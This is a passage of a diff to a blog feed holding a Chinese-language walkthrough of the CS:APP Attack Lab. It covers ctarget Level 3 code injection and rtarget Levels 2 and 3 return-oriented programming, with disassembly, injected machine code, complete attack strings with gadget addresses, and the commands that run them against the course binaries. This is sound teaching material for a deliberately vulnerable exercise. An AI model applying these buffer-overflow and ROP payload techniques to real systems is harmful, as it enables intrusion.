+00 56 c3 00 00 00 00 00
+58 1b 62 55 00 00 00 00
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;将上述字符串储存在 &lt;code&gt;phase_2.txt&lt;/code&gt;  中&lt;/p&gt;
+&lt;p&gt;&amp;lt;big&amp;gt;&lt;strong&gt;6) 将字符串转化为字节码并运行程序&lt;/strong&gt; &amp;lt;/big&amp;gt;&lt;/p&gt;
+&lt;p&gt;输入以下命令即可完成 &lt;code&gt;touch2&lt;/code&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;./hex2raw &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; phase_2.txt &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; phase_2_raw.txt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;gdb ctarget&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;r &lt;span class=&#34;token parameter variable&#34;&gt;-i&lt;/span&gt; phase_2_raw.txt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;level-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#level-3&#34;&gt;#&lt;/a&gt; Level 3&lt;/h3&gt;
+&lt;p&gt;任务要求 &lt;code&gt;ctarget&lt;/code&gt;  程序执行 &lt;code&gt;touch3&lt;/code&gt;  函数，而非返回 &lt;code&gt;test&lt;/code&gt;  函数&lt;/p&gt;
+&lt;p&gt;注意 &lt;code&gt;touch3&lt;/code&gt;  函数内部调用了 &lt;code&gt;hexmatch&lt;/code&gt;  函数&lt;/p&gt;
+&lt;p&gt;&amp;lt;big&amp;gt;&lt;strong&gt;1) 查看 &lt;code&gt;touch3&lt;/code&gt; 、 &lt;code&gt;hexmatch&lt;/code&gt;  函数 C 代码&lt;/strong&gt; &amp;lt;/big&amp;gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;int hexmatch(unsigned val, char *sval)&amp;#123;
+    char cbuf[110];
+    char *s = cbuf + random() % 100;
+    sprintf(s, &amp;quot;%.8x&amp;quot;, val);
+    return strncmp(sval, s, 9) == 0;
+&amp;#125;
+void touch3(char *sval)&amp;#123;
+    vlevel = 3;
+    if (hexmatch(cookie, sval))&amp;#123;
+        printf(&amp;quot;Touch3!: You called touch3(\&amp;quot;%s\&amp;quot;)\n&amp;quot;, sval);
+        validate(3);
+    &amp;#125; else &amp;#123;
+        printf(&amp;quot;Misfire: You called touch3(\&amp;quot;%s\&amp;quot;)\n&amp;quot;, sval);
+        fail(3);
+    &amp;#125;
+    exit(0);
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;hexmatch 需要传入 &lt;code&gt;cookie&lt;/code&gt;  值，并且需要将 &lt;code&gt;cookie&lt;/code&gt;  值以字符串形式传入&lt;/p&gt;
+&lt;p&gt;&amp;lt;big&amp;gt;&lt;strong&gt;2) 查看 &lt;code&gt;test&lt;/code&gt; 、 &lt;code&gt;touch3&lt;/code&gt;  函数汇编代码&lt;/strong&gt; &amp;lt;/big&amp;gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-assembly&#34;&gt;Dump of assembler code for function test:
+   0x0000555555401c32 &amp;lt;+0&amp;gt;:	sub    $0x8,%rsp
+   0x0000555555401c36 &amp;lt;+4&amp;gt;:	mov    $0x0,%eax
+   0x0000555555401c3b &amp;lt;+9&amp;gt;:	call   0x555555401a65 &amp;lt;getbuf&amp;gt;
+   0x0000555555401c40 &amp;lt;+14&amp;gt;:	mov    %eax,%edx
+   0x0000555555401c42 &amp;lt;+16&amp;gt;:	lea    0x1877(%rip),%rsi        # 0x5555554034c0
+   0x0000555555401c49 &amp;lt;+23&amp;gt;:	mov    $0x1,%edi
+   0x0000555555401c4e &amp;lt;+28&amp;gt;:	mov    $0x0,%eax
+   0x0000555555401c53 &amp;lt;+33&amp;gt;:	call   0x555555400f30 &amp;lt;__printf_chk@plt&amp;gt;
+   0x0000555555401c58 &amp;lt;+38&amp;gt;:	add    $0x8,%rsp
+   0x0000555555401c5c &amp;lt;+42&amp;gt;:	ret    
+End of assembler dump.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-assembly&#34;&gt;Dump of assembler code for function touch3:
+   0x0000555555401bc0 &amp;lt;+0&amp;gt;:	push   %rbx
+   0x0000555555401bc1 &amp;lt;+1&amp;gt;:	mov    %rdi,%rbx
+   0x0000555555401bc4 &amp;lt;+4&amp;gt;:	movl   $0x3,0x20380e(%rip)        # 0x5555556053dc &amp;lt;vlevel&amp;gt;
+   0x0000555555401bce &amp;lt;+14&amp;gt;:	mov    %rdi,%rsi
+   0x0000555555401bd1 &amp;lt;+17&amp;gt;:	mov    0x20380d(%rip),%edi        # 0x5555556053e4 &amp;lt;cookie&amp;gt;
+   0x0000555555401bd7 &amp;lt;+23&amp;gt;:	call   0x555555401b0d &amp;lt;hexmatch&amp;gt;
+   0x0000555555401bdc &amp;lt;+28&amp;gt;:	test   %eax,%eax
+   0x0000555555401bde &amp;lt;+30&amp;gt;:	je     0x555555401c0d &amp;lt;touch3+77&amp;gt;
+   0x0000555555401be0 &amp;lt;+32&amp;gt;:	mov    %rbx,%rdx
+   0x0000555555401be3 &amp;lt;+35&amp;gt;:	lea    0x1886(%rip),%rsi        # 0x555555403470
+   0x0000555555401bea &amp;lt;+42&amp;gt;:	mov    $0x1,%edi
+   0x0000555555401bef &amp;lt;+47&amp;gt;:	mov    $0x0,%eax
+   0x0000555555401bf4 &amp;lt;+52&amp;gt;:	call   0x555555400f30 &amp;lt;__printf_chk@plt&amp;gt;
+   0x0000555555401bf9 &amp;lt;+57&amp;gt;:	mov    $0x3,%edi
+   0x0000555555401bfe &amp;lt;+62&amp;gt;:	call   0x555555401f75 &amp;lt;validate&amp;gt;
+   0x0000555555401c03 &amp;lt;+67&amp;gt;:	mov    $0x0,%edi
+   0x0000555555401c08 &amp;lt;+72&amp;gt;:	call   0x555555400f80 &amp;lt;exit@plt&amp;gt;
+   0x0000555555401c0d &amp;lt;+77&amp;gt;:	mov    %rbx,%rdx
+   0x0000555555401c10 &amp;lt;+80&amp;gt;:	lea    0x1881(%rip),%rsi        # 0x555555403498
+   0x0000555555401c17 &amp;lt;+87&amp;gt;:	mov    $0x1,%edi
+   0x0000555555401c1c &amp;lt;+92&amp;gt;:	mov    $0x0,%eax
+   0x0000555555401c21 &amp;lt;+97&amp;gt;:	call   0x555555400f30 &amp;lt;__printf_chk@plt&amp;gt;
+   0x0000555555401c26 &amp;lt;+102&amp;gt;:	mov    $0x3,%edi
+   0x0000555555401c2b &amp;lt;+107&amp;gt;:	call   0x555555402045 &amp;lt;fail&amp;gt;
+   0x0000555555401c30 &amp;lt;+112&amp;gt;:	jmp    0x555555401c03 &amp;lt;touch3+67&amp;gt;
+End of assembler dump.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;可以看出:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;test&lt;/code&gt;  函数入口为 &lt;code&gt;0x0000555555401c32&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;touch3&lt;/code&gt;  函数入口为 &lt;code&gt;0x0000555555401bc0&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&amp;lt;big&amp;gt;&lt;strong&gt;3) 构建汇编代码&lt;/strong&gt; &amp;lt;/big&amp;gt;&lt;/p&gt;
+&lt;p&gt;阅读题干所给提示:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;需要一个字符串表示 &lt;code&gt;cookie&lt;/code&gt;  值，不需要表示开头 &lt;code&gt;0x&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;在 C 语言中字符串是以 &lt;code&gt;\0&lt;/code&gt;  结尾，所以在字符串序列的结尾是一个字节 0&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;man ascii&lt;/code&gt;  可以用来查看每个字符的 16 进制表示&lt;/li&gt;
+&lt;li&gt;需要在 &lt;code&gt;%rdi&lt;/code&gt;  寄存器内储存字符串的地址&lt;/li&gt;
+&lt;li&gt;当调用 &lt;code&gt;hexmatch&lt;/code&gt;  和 &lt;code&gt;strncmp&lt;/code&gt;  时，他们会把数据压入到栈中，有可能会覆盖 &lt;code&gt;getbuf&lt;/code&gt;  栈帧的数据，所以传进去字符串的位置必须小心谨慎&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;因此汇编代码设计思路为:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;将字符串写入到不容易被覆盖的 &lt;code&gt;test&lt;/code&gt;  函数栈空间，将该地址送入 &lt;code&gt;%rdi&lt;/code&gt;  寄存器&lt;/li&gt;
+&lt;li&gt;压入含 &lt;code&gt;touch3&lt;/code&gt;  入口地址的寄存器&lt;/li&gt;
+&lt;li&gt;ret 返回&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;注意 &lt;code&gt;cookie&lt;/code&gt;  值需要转化为 16 进制 ASCII 码表示后使用&lt;/p&gt;
+&lt;p&gt;根据题目提示 &lt;code&gt;0x&lt;/code&gt;  不需要表示，并且字符串结尾为 0 字节，则对应 ASCII 码表示为&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;0x3e8dee8f &amp;gt;&amp;gt; 33 65 38 64 65 65 38 66 00
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;我们还需要知道 &lt;code&gt;test函数&lt;/code&gt; 栈帧地址&lt;/p&gt;
+&lt;p&gt;输入以下命令查看&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-assembly&#34;&gt;gdb ctarget
+b *0x0000555555401c32 # test函数入口
+r -qi phase_1_raw.txt
+stepi
+p $rsp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;结果显示&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$1&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;void *&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; 0x55621b78&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;因此我们需要构建的汇编代码为&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-assembly&#34;&gt;movq $0x55621b78,%rdi
+movq $0x0000555555401bc0,%rdx
+push %rdx
+ret
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;将上述内容储存在 &lt;code&gt;phase_3_assembly.s&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&amp;lt;big&amp;gt;&lt;strong&gt;4) 获得机械码&lt;/strong&gt; &amp;lt;/big&amp;gt;&lt;/p&gt;
+&lt;p&gt;输入以下命令获得机械码&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;gcc &lt;span class=&#34;token parameter variable&#34;&gt;-c&lt;/span&gt; phase_3_assembly.s &lt;span class=&#34;token parameter variable&#34;&gt;-o&lt;/span&gt; phase_3_assembly.o&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;objdump &lt;span class=&#34;token parameter variable&#34;&gt;-d&lt;/span&gt; phase_3_assembly.o &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; phase_3_assembly.d&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;打开 &lt;code&gt;phase_3_assembly.d&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-assembly&#34;&gt;Disassembly of section .text:
+
+0000000000000000 &amp;lt;.text&amp;gt;:
+   0:	48 c7 c7 78 1b 62 55 	mov    $0x55621b78,%rdi
+   7:	48 ba c0 1b 40 55 55 	movabs $0x555555401bc0,%rdx
+   e:	55 00 00 
+  11:	52                   	push   %rdx
+  12:	c3                   	ret    
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;则机械码为&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;48 c7 c7 78 1b 62 55 48 ba c0 1b 40 55 55 55 00 00 52 c3
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;lt;big&amp;gt;&lt;strong&gt;5) 构建攻击字符串&lt;/strong&gt; &amp;lt;/big&amp;gt;&lt;/p&gt;
+&lt;p&gt;思路为:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;getbuff&lt;/code&gt;  函数获取攻击字符串&lt;/li&gt;
+&lt;li&gt;字符串足够长，使得 &lt;code&gt;cookie&lt;/code&gt;  的 16 进制值储存在 test 栈空间&lt;/li&gt;
+&lt;li&gt;字符串使得 &lt;code&gt;getbuff&lt;/code&gt;  函数返回至 &lt;code&gt;buff&lt;/code&gt;  数组起点&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;buff&lt;/code&gt;  数组起点按顺序储存机械码&lt;/li&gt;
+&lt;li&gt;程序按照储存的机械码执行我们设计好的汇编指令&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;buff&lt;/code&gt;  数组起点的内存地址由 Level 2 可知为 &lt;code&gt;0x55621b58&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;故构建如下字符串&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;48 c7 c7 78 1b 62 55 48
+ba c0 1b 40 55 55 55 00
+00 52 c3 00 00 00 00 00
+58 1b 62 55 00 00 00 00
+33 65 38 64 65 65 38 66
+00
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;将上述字符串储存在 &lt;code&gt;phase_3.txt&lt;/code&gt;  中&lt;/p&gt;
+&lt;p&gt;&amp;lt;big&amp;gt;&lt;strong&gt;6) 将字符串转化为字节码并运行程序&lt;/strong&gt; &amp;lt;/big&amp;gt;&lt;/p&gt;
+&lt;p&gt;输入以下命令即可完成 &lt;code&gt;touch3&lt;/code&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;./hex2raw &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; phase_3.txt &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; phase_3_raw.txt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;gdb ctarget&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;r &lt;span class=&#34;token parameter variable&#34;&gt;-i&lt;/span&gt; phase_3_raw.txt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;rtarget&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rtarget&#34;&gt;#&lt;/a&gt; rtarget&lt;/h2&gt;
+&lt;p&gt;题干所给信息翻译如下:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;这一部分攻击 rtarget 程序，但是这个程序使用了两种技术防止代码注入攻击：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;每次栈的位置是随机的，于是我们没有办法确定需要跳转的地址&lt;/li&gt;
+&lt;li&gt;即使我们能够找到规律注入代码，但是栈是不可执行的，一旦执行，则会遇到段错误&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;所以只能利用已有的可执行的代码，来完成我们的操作，称为 &lt;code&gt;retrun-oriented programming(ROP)&lt;/code&gt; ，策略就是找到现存代码中的若干条指令，这些指令后面跟着指令 ret，每次 return 相当于从一个 gadget 跳转到另一个 gadget 中，然后通过这样不断跳转来完成我们想要的操作。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;使用如下命令获得 &lt;code&gt;farm.c&lt;/code&gt;  的反汇编&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;gcc -c -Og farm.c
+objdump -d farm.o &amp;gt; farm.d
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;level-2-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#level-2-2&#34;&gt;#&lt;/a&gt; Level 2&lt;/h3&gt;
+&lt;p&gt;这一关要求我们重复上一部分 Level 2 的攻击，但是无法对 rtarget 进行代码注入攻击，我们只能使用 ROP 攻击：利用 farm.c 中的程序的 gadget，构造我们需要的指令，在 rtarget 中执行&lt;/p&gt;
+&lt;p&gt;&amp;lt;big&amp;gt;&lt;strong&gt;1) 选取 gadgets&lt;/strong&gt;&amp;lt;/big&amp;gt;&lt;/p&gt;
+&lt;p&gt;阅读题目提示:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;我们利用的 gadget 是从 startfarm 到 midfarm 之间的&lt;/li&gt;
+&lt;li&gt;只需要两个 gadget&lt;/li&gt;
+&lt;li&gt;当使用 popq 指令时，你的 exploit string 中必须含有一个地址和 data&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;因此我们需要的汇编指令为&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-assembly&#34;&gt;popq %rax
+movq %rax,%rdi
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;对应的编码为&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;popq %rax &amp;gt; 58
+movq %rax,%rdi &amp;gt; 48 89 c7
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;popq %rax&lt;/code&gt;  对应函数为&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-assembly&#34;&gt;Dump of assembler code for function getval_373:
+   0x0000555555401c70 &amp;lt;+0&amp;gt;:	b8 d3 f5 c2 58	mov    $0x58c2f5d3,%eax
+   0x0000555555401c75 &amp;lt;+5&amp;gt;:	c3	ret    
+End of assembler dump. 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;我们得出 &lt;code&gt;popq %rax&lt;/code&gt;  指令的地址为 &lt;code&gt;0x0000555555401c70+0x4 =0x0000555555401c74&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;movq %rax,%rdi&lt;/code&gt;  对应函数为&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-assembly&#34;&gt;Dump of assembler code for function getval_424:
+   0x0000555555401c84 &amp;lt;+0&amp;gt;:	b8 48 89 c7 c3	mov    $0xc3c78948,%eax
+   0x0000555555401c89 &amp;lt;+5&amp;gt;:	c3	ret    
+End of assembler dump.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;我们得出 &lt;code&gt;movq %rax,%rdi&lt;/code&gt;  指令的地址为 &lt;code&gt;0x0000555555401c84+0x1 =0x0000555555401c85&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;反汇编得 &lt;code&gt;touch2&lt;/code&gt;  函数入口为 &lt;code&gt;0x0000555555401aa9 &lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&amp;lt;big&amp;gt;&lt;strong&gt;2) 构建攻击字符串&lt;/strong&gt; &amp;lt;/big&amp;gt;&lt;/p&gt;
+&lt;p&gt;需要使用的地址&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;0x0000555555401aa9 # touch2函数入口地址
+0x0000555555401c85 # 48 89 c7 movq %rax, %rdi
+0x3e8dee8f # cookie
+0x0000555555401c74 # 58 popq %rax
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;构建的 &lt;code&gt;phase_4.txt&lt;/code&gt;  如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+74 1c 40 55 55 55 00 00
+8f ee 8d 3e 00 00 00 00
+85 1c 40 55 55 55 00 00
+a9 1a 40 55 55 55 00 00
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;lt;big&amp;gt;&lt;strong&gt;3) 将字符串转化为字节码并运行程序&lt;/strong&gt; &amp;lt;/big&amp;gt;&lt;/p&gt;
+&lt;p&gt;输入以下命令即可完成 &lt;code&gt;touch2&lt;/code&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;./hex2raw &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; phase_4.txt &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; phase_4_raw.txt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;gdb rtarget&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;r &lt;span class=&#34;token parameter variable&#34;&gt;-i&lt;/span&gt; phase_4_raw.txt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;level-3-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#level-3-2&#34;&gt;#&lt;/a&gt; Level 3&lt;/h3&gt;
+&lt;p&gt;这一关要求我们重复上一部分 Level 3 的攻击，使用 ROP 攻击的形式。&lt;/p&gt;
+&lt;p&gt;&amp;lt;big&amp;gt;&lt;strong&gt;1) 选取 gadgets&lt;/strong&gt;&amp;lt;/big&amp;gt;&lt;/p&gt;
+&lt;p&gt;阅读题目提示:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;建议查看 movl 指令对 4 字节以上操作的影响&lt;/li&gt;
+&lt;li&gt;官方解决方法用了 8 个 gadgets&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;由 &lt;code&gt;ctarget level 3&lt;/code&gt;  可知， &lt;code&gt;cookie&lt;/code&gt;  的 ASCII 字符串表示为&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;0x3e8dee8f &amp;gt;&amp;gt; 33 65 38 64 65 65 38 66 00
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;因为栈地址随机，因此需要找到基准地址，此处选取 % rsp&lt;/p&gt;
+&lt;p&gt;具体操作:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;把 % rsp 里的栈指针地址放到 % rdi&lt;/li&gt;
+&lt;li&gt;拿到 bias 的值放到 % rsi&lt;/li&gt;
+&lt;li&gt;利用 add xy，把栈指针地址和 bias 加起来放到 % rax，再传到 % rdi&lt;/li&gt;
+&lt;li&gt;调用 touch3&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;因此我们需要的汇编指令为&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;movq %rsp,%rax
+movq %rax,%rdi
+popq %rax
+movl %eax,%edx
+movl %edx,%ecx
+movl %ecx,%esi
+lea (%rdi,%rsi,1),%rax
+movq %rax,%rdi
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;对应的编码、函数、地址为&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;movq %rsp,%rax &amp;gt; 48 89 e0 &amp;gt; addval_101 &amp;gt; 0x0000555555401cb3
+movq %rax,%rdi &amp;gt; 48 89 c7 &amp;gt; setval_417 &amp;gt; 0x0000555555401c8c
+popq %rax &amp;gt; 58 &amp;gt; getval_373 &amp;gt; 0x0000555555401c74
+movl %eax,%edx &amp;gt; 89 c2 &amp;gt; addval_467 &amp;gt; 0x0000555555401ca5
+movl %edx,%ecx &amp;gt; 89 d1 &amp;gt; setval_191 &amp;gt; 0x0000555555401cac
+movl %ecx,%esi &amp;gt; 89 ce &amp;gt; setval_422 &amp;gt; 0x0000555555401cd5
+lea (%rdi,%rsi,1),%rax &amp;gt; 48 8d 04 37 &amp;gt; add_xy &amp;gt; 0x0000555555401c9e
+movq %rax,%rdi &amp;gt; 48 89 c7 &amp;gt; getval_424 &amp;gt; 0x0000555555401c85
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;lt;big&amp;gt;&lt;strong&gt;2) 构建攻击字符串&lt;/strong&gt; &amp;lt;/big&amp;gt;&lt;/p&gt;
+&lt;p&gt;需要使用的地址&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;0x0000555555401cb3 # movq %rsp,%rax
+0x0000555555401c8c # movq %rax,%rdi
+0x0000555555401c74 # popq %rax
+0x48 # bias = 9*8--&amp;gt;0x48
+0x0000555555401ca5 # movl %eax,%edx
+0x0000555555401cac # movl %edx,%ecx
+0x0000555555401cd5 # movl %ecx,%esi
+0x0000555555401c9e # lea (%rdi,%rsi,1),%rax
+0x0000555555401c85 # movq %rax,%rdi
+0x0000555555401bc0 # touch3
+0x3365386465653866 # hex cookie string
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;构建的攻击字符串为&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+b3 1c 40 55 55 55 00 00
+8c 1c 40 55 55 55 00 00
+74 1c 40 55 55 55 00 00
+48 00 00 00 00 00 00 00
+a5 1c 40 55 55 55 00 00
+ac 1c 40 55 55 55 00 00
+d5 1c 40 55 55 55 00 00
+9e 1c 40 55 55 55 00 00
+85 1c 40 55 55 55 00 00
+c0 1b 40 55 55 55 00 00
+33 65 38 64 65 65 38 66
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;保存为 &lt;code&gt;phase_5.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&amp;lt;big&amp;gt;&lt;strong&gt;3) 将字符串转化为字节码并运行程序&lt;/strong&gt; &amp;lt;/big&amp;gt;&lt;/p&gt;
+&lt;p&gt;输入以下命令即可完成 `touch23&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;./hex2raw &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; phase_5.txt &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; phase_5_raw.txt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;gdb rtarget&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;r &lt;span class=&#34;token parameter variable&#34;&gt;-i&lt;/span&gt; phase_5_raw.txt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
+        <updated>2023-11-19T14:26:15.955Z</updated>
+    </entry>
     <entry>
         <id>https://aquaoh.cc/2023/11/18/hello-world/</id>
         <title>Hello World</title>
